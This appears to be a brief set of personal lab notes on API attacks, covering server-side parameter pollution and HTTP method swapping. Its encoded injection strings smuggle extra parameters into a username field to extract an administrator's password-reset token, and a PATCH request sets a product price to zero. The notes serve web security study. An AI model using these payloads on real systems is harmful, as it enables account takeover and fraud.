[#](#) API

### Server-side parameter pullution

Other Parameters?

    username=administrator%26x=y

Truncate the request with enconded chars (%23 -> #) to help interpret the server-side request

    username=administrator%23AAAA
    -> Field not specified
    username=administrator%26field=y
    -> Invalid field.
    username=administrator%26field=§1§#  (intruder -> Server Side Variable Names)
    
    Original
    username=administrator
    ->  "result":"administrator@normal-user.net",
        "type":"email"
        
Parameter Swapping?

    /static/js/forgotPassword.js
    Search for params and URLs ("?", "href", "location", etc...)
    window.location.href = `/forgot-password?reset_token=${resetToken}`
    
    
    username=administrator%26field=reset_token
    secret_token_:)
    /forgot-password?reset_token=secret_token:)
    
Change Method (RESTful)

    GET /api/products/1/price
    "price":"$0.00"
    PUT /api/products/1/price
    PATCH /api/products/1/price
    {"price":"0"}
